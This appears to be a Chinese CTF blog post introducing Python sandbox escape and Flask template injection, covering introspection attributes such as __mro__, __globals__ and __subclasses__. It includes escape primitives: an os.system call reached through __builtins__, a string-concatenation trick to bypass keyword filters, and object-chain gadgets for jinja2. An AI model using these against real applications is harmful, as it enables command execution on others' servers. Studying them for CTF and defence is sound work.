<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="前言：由于最近在打比赛时经常遇到各种python沙箱逃逸和ssti模板注入知识因此自己总结一波。 0x01 基础知识dir()函数dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法dir()，该方法将被调用。如果参数不包含dir()，该方法将最大限度地收集参数信息。1234&amp;gt;&amp;gt;&amp;gt; dir()[&amp;apos;_">
<meta property="og:type" content="article">
<meta property="og:title" content="python沙箱逃逸和flask模板注入知识总结">
<meta property="og:url" content="http://yoursite.com/2019/10/08/python沙箱逃逸和flask模板注入知识总结/index.html">
<meta property="og:site_name" content="L&#39;s Blog">
<meta property="og:description" content="前言：由于最近在打比赛时经常遇到各种python沙箱逃逸和ssti模板注入知识因此自己总结一波。 0x01 基础知识dir()函数dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法dir()，该方法将被调用。如果参数不包含dir()，该方法将最大限度地收集参数信息。1234&amp;gt;&amp;gt;&amp;gt; dir()[&amp;apos;_">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-10-08T13:23:53.750Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="python沙箱逃逸和flask模板注入知识总结">
<meta name="twitter:description" content="前言：由于最近在打比赛时经常遇到各种python沙箱逃逸和ssti模板注入知识因此自己总结一波。 0x01 基础知识dir()函数dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法dir()，该方法将被调用。如果参数不包含dir()，该方法将最大限度地收集参数信息。1234&amp;gt;&amp;gt;&amp;gt; dir()[&amp;apos;_">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/10/08/python沙箱逃逸和flask模板注入知识总结/">





  <title>python沙箱逃逸和flask模板注入知识总结 | L's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">L's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">share with you</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/08/python沙箱逃逸和flask模板注入知识总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ljdd520">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">python沙箱逃逸和flask模板注入知识总结</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-08T21:07:17+08:00">
                2019-10-08
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  9k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  48
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>由于最近在打比赛时经常遇到各种python沙箱逃逸和ssti模板注入知识因此自己总结一波。</p>
<h4 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h4><h4 id="dir-函数"><a href="#dir-函数" class="headerlink" title="dir()函数"></a>dir()函数</h4><h5 id="dir-函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法dir-，该方法将被调用。如果参数不包含dir-，该方法将最大限度地收集参数信息。"><a href="#dir-函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法dir-，该方法将被调用。如果参数不包含dir-，该方法将最大限度地收集参数信息。" class="headerlink" title="dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法dir()，该方法将被调用。如果参数不包含dir()，该方法将最大限度地收集参数信息。"></a>dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法<strong>dir</strong>()，该方法将被调用。如果参数不包含<strong>dir</strong>()，该方法将最大限度地收集参数信息。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir()</span><br><span class="line">[&apos;__annotations__&apos;, &apos;__builtins__&apos;, &apos;__doc__&apos;, &apos;__loader__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;__spec__&apos;]</span><br><span class="line">&gt;&gt;&gt; dir([])</span><br><span class="line">[&apos;__add__&apos;, &apos;__class__&apos;, &apos;__contains__&apos;, &apos;__delattr__&apos;, &apos;__delitem__&apos;, &apos;__dir__&apos;, &apos;__doc__&apos;, &apos;__eq__&apos;, &apos;__format__&apos;, &apos;__ge__&apos;, &apos;__getattribute__&apos;, &apos;__getitem__&apos;, &apos;__gt__&apos;, &apos;__hash__&apos;, &apos;__iadd__&apos;, &apos;__imul__&apos;, &apos;__init__&apos;, &apos;__init_subclass__&apos;, &apos;__iter__&apos;, &apos;__le__&apos;, &apos;__len__&apos;, &apos;__lt__&apos;, &apos;__mul__&apos;, &apos;__ne__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__reversed__&apos;, &apos;__rmul__&apos;, &apos;__setattr__&apos;, &apos;__setitem__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;append&apos;, &apos;clear&apos;, &apos;copy&apos;, &apos;count&apos;, &apos;extend&apos;, &apos;index&apos;, &apos;insert&apos;, &apos;pop&apos;, &apos;remove&apos;, &apos;reverse&apos;, &apos;sort&apos;]</span><br></pre></td></tr></table></figure>

<h4 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a>__builtins__</h4><h5 id="builtins-即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于-builtins-却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。"><a href="#builtins-即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于-builtins-却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。" class="headerlink" title="__builtins__即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于__builtins__却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。"></a>__builtins__即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于__builtins__却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。</h5><h5 id="可以通过dir-函数来查看该模块内包含的函数，同时也可以通过dict属性调用这些函数。"><a href="#可以通过dir-函数来查看该模块内包含的函数，同时也可以通过dict属性调用这些函数。" class="headerlink" title="可以通过dir()函数来查看该模块内包含的函数，同时也可以通过dict属性调用这些函数。"></a>可以通过dir()函数来查看该模块内包含的函数，同时也可以通过dict属性调用这些函数。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 下面代码可列出所有的内联函数</span><br><span class="line">&gt;&gt;&gt; dir(__builtins__)</span><br><span class="line">[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;WindowsError&apos;, &apos;ZeroDivisionError&apos;, &apos;_&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</span><br><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line"># Python3有一个builtins模块，可以导入builtins模块后通过dir函数查看所有的内联函数</span><br><span class="line">import builtins</span><br><span class="line">dir(builtins)</span><br></pre></td></tr></table></figure>

<h4 id="import"><a href="#import" class="headerlink" title="__import__"></a>__import__</h4><h5 id="import-接收字符串作为参数，导入该字符串名称的模块。"><a href="#import-接收字符串作为参数，导入该字符串名称的模块。" class="headerlink" title="__import__接收字符串作为参数，导入该字符串名称的模块。"></a>__import__接收字符串作为参数，导入该字符串名称的模块。</h5><h5 id="如import-sys相当于-import-‘sys’-，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式Bypass过滤，如：-import-‘o’-’s’-system-‘ca’-’lc’-。"><a href="#如import-sys相当于-import-‘sys’-，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式Bypass过滤，如：-import-‘o’-’s’-system-‘ca’-’lc’-。" class="headerlink" title="如import sys相当于__import__(‘sys’)，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式Bypass过滤，如：__import__(‘o’+’s’).system(‘ca’+’lc’)。"></a>如import sys相当于__import__(‘sys’)，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式Bypass过滤，如：__import__(‘o’+’s’).system(‘ca’+’lc’)。</h5><h4 id="bases"><a href="#bases" class="headerlink" title="__bases__"></a>__bases__</h4><h5 id="返回一个类直接所继承的类-元组表示"><a href="#返回一个类直接所继承的类-元组表示" class="headerlink" title="返回一个类直接所继承的类(元组表示)"></a>返回一个类直接所继承的类(元组表示)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base2</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(Base1, Base2)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span><span class="params">(test)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> test.__bases__</span><br><span class="line"><span class="keyword">print</span> test2.__bases__</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">(&lt;class __main__.Base1 at 0x00000000030E9768&gt;, &lt;class __main__.Base2 at 0x0000000003645B28&gt;)</span></span><br><span class="line"><span class="string">(&lt;class __main__.test at 0x0000000003645B88&gt;,)</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<h4 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a>__mro__</h4><h5 id="method-resolution-order-解析方法调用的顺序"><a href="#method-resolution-order-解析方法调用的顺序" class="headerlink" title="method resolution order(解析方法调用的顺序)"></a>method resolution order(解析方法调用的顺序)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'A.foo()'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'B.foo()'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span><span class="params">(B, A)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">c = C()</span><br><span class="line">c.foo()</span><br><span class="line"><span class="keyword">print</span> C.__base__</span><br><span class="line"><span class="keyword">print</span> C.__bases__</span><br><span class="line"><span class="keyword">print</span> C.__mro__</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">B.foo()</span></span><br><span class="line"><span class="string">&lt;class '__main__.B'&gt;</span></span><br><span class="line"><span class="string">(&lt;class '__main__.B'&gt;, &lt;class '__main__.A'&gt;)</span></span><br><span class="line"><span class="string">(&lt;class '__main__.C'&gt;, &lt;class '__main__.B'&gt;, &lt;class '__main__.A'&gt;, &lt;type 'object'&gt;)</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<h5 id="可以看出-base-返回第一个调用的基类，-mro-表示调用的顺序。"><a href="#可以看出-base-返回第一个调用的基类，-mro-表示调用的顺序。" class="headerlink" title="可以看出__base__返回第一个调用的基类，__mro__表示调用的顺序。"></a>可以看出__base__返回第一个调用的基类，__mro__表示调用的顺序。</h5><h4 id="class"><a href="#class" class="headerlink" title="__class__"></a>__class__</h4><h5 id="返回一个实例所属的类"><a href="#返回一个实例所属的类" class="headerlink" title="返回一个实例所属的类"></a>返回一个实例所属的类</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">obj=Base()</span><br><span class="line"><span class="keyword">print</span> obj.__class__</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">__main__.Base</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<h4 id="class-指明了所属的类型"><a href="#class-指明了所属的类型" class="headerlink" title="__class__指明了所属的类型"></a>__class__指明了所属的类型</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">list</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="params">()</span>.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">tuple</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ''.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">str</span>'&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a>__globals__</h4><h5 id="globals-是一个特殊属性，能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules。"><a href="#globals-是一个特殊属性，能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules。" class="headerlink" title="__globals__是一个特殊属性，能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules。"></a>__globals__是一个特殊属性，能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules。</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">var=<span class="number">520</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> test.__init__.__globals__</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    '__builtins__': &lt;module '__builtin__' (built-in)&gt;,</span></span><br><span class="line"><span class="string">    '__file__': 'D:/PycharmProjects/de1ctf/venv/web/demo.py', </span></span><br><span class="line"><span class="string">    '__package__': None, </span></span><br><span class="line"><span class="string">    'fun': &lt;function fun at 0x0000000002D0C588&gt;, </span></span><br><span class="line"><span class="string">    'test': &lt;class __main__.test at 0x0000000002D69768&gt;, </span></span><br><span class="line"><span class="string">    'var': 520, '__name__': '__main__', </span></span><br><span class="line"><span class="string">    'os': &lt;module 'os' from 'D:\PycharmProjects\de1ctf\venv\lib\os.pyc'&gt;, </span></span><br><span class="line"><span class="string">    '__doc__': None</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<h4 id="object类"><a href="#object类" class="headerlink" title="object类"></a>object类</h4><h5 id="python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过-mro-和-bases-两种方式来创建object的方法如下："><a href="#python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过-mro-和-bases-两种方式来创建object的方法如下：" class="headerlink" title="python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过__mro__和__bases__两种方式来创建object的方法如下："></a>python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过__mro__和__bases__两种方式来创建object的方法如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2]</span><br><span class="line">[].__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[1]</span><br><span class="line">().__class__.__mro__[1]</span><br><span class="line">[].__class__.__mro__[-1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-1]</span><br><span class="line">().__class__.__mro__[-1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用</span><br></pre></td></tr></table></figure>

<h4 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a>__subclasses__()</h4><h5 id="获取一个类的子类，返回的是一个列表"><a href="#获取一个类的子类，返回的是一个列表" class="headerlink" title="获取一个类的子类，返回的是一个列表"></a>获取一个类的子类，返回的是一个列表</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(Base)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> Base.__subclasses__()</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[&lt;class '__main__.test'&gt;]</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

